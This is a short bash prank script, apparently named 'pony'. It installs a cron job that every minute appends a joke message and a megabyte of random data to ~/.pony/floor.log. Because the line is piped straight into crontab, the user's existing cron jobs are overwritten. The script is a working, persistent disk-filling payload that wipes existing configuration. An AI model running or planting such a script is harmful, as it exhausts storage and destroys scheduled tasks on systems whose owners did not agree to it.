#!/usr/bin/env bash
mkdir -p .pony
echo '* * * * * echo "Important Message: Your pony just pooped on the floor!\n$(head /dev/urandom -c 1000000)" >> ~/.pony/floor.log' | crontab 
